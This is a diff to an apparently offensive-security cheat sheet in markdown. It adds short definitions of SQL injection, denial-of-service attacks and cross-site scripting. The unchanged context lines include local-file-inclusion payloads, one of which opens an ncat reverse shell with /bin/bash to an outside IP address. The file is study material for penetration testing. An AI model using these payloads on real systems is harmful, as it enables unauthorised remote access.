@@ -107,6 +107,7 @@ attacker in accept language
           ?file=/var/log/auth.log&c=ls -la
           ?file=/var/log/auth.log&c=ncat -e /bin/bash 192.168.1.2 1234
   ## 3. SQL Injection
+   SQi is a method by which an attacker exploits vulnerabilities in the way a `database executes search queries`. Attackers use SQi to gain access to unauthorized information, modify or create new user permissions, or otherwise manipulate or destroy sensitive data.
     
    Testing
       
@@ -406,12 +407,20 @@ SECOND CHARACTER:
  
  reference
      * https://forum.hackthebox.com/t/lazy-mini-writeup-ways-to-login/88
+     
+ ## 5. Denial-of-service (DoS) and distributed denial-of-service (DDoS) attacks -
+ 
+   Through a variety of vectors, attackers are able to overload a targeted server or its surrounding infrastructure with different types of attack traffic. When a server is no longer able to effectively process incoming requests, it begins to behave sluggishly and eventually deny service to incoming requests from legitimate users.
+   
   ==================================================== <br>
 
 # Client side Exploitation
   ==================================================== <br>
 
 ## Cross site scripting (XSS)
+
+   XSS is a vulnerability that allows an attacker to inject client-side scripts into a webpage in order to access important information directly, impersonate the user, or trick the user into revealing important information.
+ 
 ## XSS(Reflected)
 ### Basic XSS
   * Testing.  
